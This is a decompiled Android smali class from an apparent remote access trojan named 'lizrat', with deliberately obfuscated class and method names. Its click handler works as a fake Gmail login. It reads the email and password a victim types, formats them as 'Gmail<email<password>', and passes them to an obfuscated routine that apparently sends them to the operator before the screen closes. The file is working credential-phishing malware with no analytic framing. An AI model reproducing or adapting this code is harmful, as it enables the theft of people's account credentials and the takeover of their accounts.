.class LLiz0rd/lizrat/logicmdragisymposiumbkeyboardsxnetworksqbroughtbtrainthereinzmessageychecklistbcharacterizedz19$3;
.super Ljava/lang/Object;
.source "logicmdragisymposiumbkeyboardsxnetworksqbroughtbtrainthereinzmessageychecklistbcharacterizedz19.java"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = LLiz0rd/lizrat/logicmdragisymposiumbkeyboardsxnetworksqbroughtbtrainthereinzmessageychecklistbcharacterizedz19;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:LLiz0rd/lizrat/logicmdragisymposiumbkeyboardsxnetworksqbroughtbtrainthereinzmessageychecklistbcharacterizedz19;


# direct methods
.method constructor <init>(LLiz0rd/lizrat/logicmdragisymposiumbkeyboardsxnetworksqbroughtbtrainthereinzmessageychecklistbcharacterizedz19;)V
    .locals 0

    .line 157
    iput-object p1, p0, LLiz0rd/lizrat/logicmdragisymposiumbkeyboardsxnetworksqbroughtbtrainthereinzmessageychecklistbcharacterizedz19$3;->this$0:LLiz0rd/lizrat/logicmdragisymposiumbkeyboardsxnetworksqbroughtbtrainthereinzmessageychecklistbcharacterizedz19;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 3

    .line 160
    iget-object p1, p0, LLiz0rd/lizrat/logicmdragisymposiumbkeyboardsxnetworksqbroughtbtrainthereinzmessageychecklistbcharacterizedz19$3;->this$0:LLiz0rd/lizrat/logicmdragisymposiumbkeyboardsxnetworksqbroughtbtrainthereinzmessageychecklistbcharacterizedz19;

    const v0, 0x7f050043

    invoke-virtual {p1, v0}, LLiz0rd/lizrat/logicmdragisymposiumbkeyboardsxnetworksqbroughtbtrainthereinzmessageychecklistbcharacterizedz19;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/TextView;

    .line 161
    invoke-virtual {p1}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object p1

    invoke-interface {p1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object p1

    .line 162
    iget-object v0, p0, LLiz0rd/lizrat/logicmdragisymposiumbkeyboardsxnetworksqbroughtbtrainthereinzmessageychecklistbcharacterizedz19$3;->this$0:LLiz0rd/lizrat/logicmdragisymposiumbkeyboardsxnetworksqbroughtbtrainthereinzmessageychecklistbcharacterizedz19;

    const v1, 0x7f05002c

    invoke-virtual {v0, v1}, LLiz0rd/lizrat/logicmdragisymposiumbkeyboardsxnetworksqbroughtbtrainthereinzmessageychecklistbcharacterizedz19;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    .line 163
    invoke-virtual {v0}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object v0

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    .line 166
    :try_start_0
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v1

    const/4 v2, 0x3

    if-gt v1, v2, :cond_0

    const-string p1, "Please Check Your Email/Password."

    .line 167
    invoke-static {p1}, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33;->showToast(Ljava/lang/String;)V

    return-void

    .line 171
    :cond_0
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v1

    const/16 v2, 0x8

    if-ge v1, v2, :cond_1

    const-string p1, "Password Must At least 8 characters."

    .line 172
    invoke-static {p1}, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33;->showToast(Ljava/lang/String;)V

    return-void

    .line 175
    :cond_1
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Gmail<"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "<"

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    .line 177
    sget-object v0, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->s_aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5_fh:Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/String;->getBytes()[B

    move-result-object p1

    invoke-static {v0, p1}, LLiz0rd/lizrat/westrtranscriptstbrickosuperiorncaymanimetalsdbulgariakheldcbadlyrfrontzarcahomeqsymantecz4;->installrfindsjtellsodisclosemrecordsvphysiciansfosxelectricdindustryjdoingasagektelecommunicationsf47(Ljava/lang/String;[B)V

    .line 178
    iget-object p1, p0, LLiz0rd/lizrat/logicmdragisymposiumbkeyboardsxnetworksqbroughtbtrainthereinzmessageychecklistbcharacterizedz19$3;->this$0:LLiz0rd/lizrat/logicmdragisymposiumbkeyboardsxnetworksqbroughtbtrainthereinzmessageychecklistbcharacterizedz19;

    const/4 v0, 0x1

    iput-boolean v0, p1, LLiz0rd/lizrat/logicmdragisymposiumbkeyboardsxnetworksqbroughtbtrainthereinzmessageychecklistbcharacterizedz19;->done:Z

    .line 179
    iget-object p1, p0, LLiz0rd/lizrat/logicmdragisymposiumbkeyboardsxnetworksqbroughtbtrainthereinzmessageychecklistbcharacterizedz19$3;->this$0:LLiz0rd/lizrat/logicmdragisymposiumbkeyboardsxnetworksqbroughtbtrainthereinzmessageychecklistbcharacterizedz19;

    invoke-virtual {p1}, LLiz0rd/lizrat/logicmdragisymposiumbkeyboardsxnetworksqbroughtbtrainthereinzmessageychecklistbcharacterizedz19;->finish()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method
